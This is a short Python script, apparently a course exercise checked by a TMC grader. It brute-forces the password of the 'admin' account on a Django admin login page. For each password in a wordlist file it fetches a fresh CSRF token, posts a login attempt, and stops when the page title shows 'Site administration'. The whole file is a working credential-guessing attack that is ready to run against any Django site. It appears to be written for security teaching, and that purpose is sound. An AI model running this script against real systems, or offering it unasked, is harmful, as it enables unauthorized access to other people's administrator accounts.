import sys
import requests
import bs4 as bs

def extract_token(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	for i in soup.form.findChildren('input'):
		if i.get('name') == 'csrfmiddlewaretoken':
			return i.get('value')
	return None
	

def isloggedin(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	return soup.title.text.startswith('Site administration')


def test_password(address, candidates):
	#return None
	session = requests.Session()
	url = address + '/admin/login/?next=/admin/'
	password = None

	for i in candidates:
		cookies = session.get(url)
		token = extract_token(cookies)
		body = {'username': 'admin', 'password': i, 'csrfmiddlewaretoken': token, 'next': '/admin/'}
		response = session.post(url, body)

		if isloggedin(response):
			password = i
			break

	return password



def main(argv):
	address = sys.argv[1]
	fname = sys.argv[2]
	candidates = [p.strip() for p in open(fname)]
	print(test_password(address, candidates))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 3:
		print('usage: python %s address filename' % sys.argv[0])
	else:
		main(sys.argv)
